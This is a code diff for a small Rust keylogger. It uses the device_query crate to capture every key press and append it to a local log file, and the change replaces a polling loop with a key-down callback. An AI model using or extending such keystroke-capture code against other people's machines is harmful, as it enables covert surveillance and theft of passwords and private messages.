@@ -1,6 +1,6 @@
 use std::fs::OpenOptions;
 use std::io::Write;
-use device_query::{DeviceQuery, DeviceState};
+use device_query::{DeviceQuery, DeviceState, DeviceEvents};
 
 fn main() {
 
@@ -8,26 +8,23 @@ fn main() {
 
     let device_state = DeviceState::new();
 
-    let mut prev_keys = vec![];
+   
 
-    let mut file = OpenOptions::new()
+    let _guard = device_state.on_key_down(move |key| {
+        println!("Down: {:#?}", key);
+
+        let mut file = OpenOptions::new()
         .create(true)
         .append(true)
         .open("/home/oef/log.txt")
         .expect("Failed to open file");
 
-    loop {        
-        let keys = device_state.get_keys();
-        
-        if keys != prev_keys && !keys.is_empty() {
-            // println!("[{:?}] [Keyboard] {:?}", local, keys);
-            print!("{:?}", keys[0]);
-            write!(file, "{:?}",  keys[0]).expect("Failed to write to file");
-        }
-        
-        
-        prev_keys = keys;
-    }
+        write!(file, "{}",  key).expect("Failed to write to file");
+    });
+
+    // get the key and write it to the file
+    
+    loop {}
 }
 
 
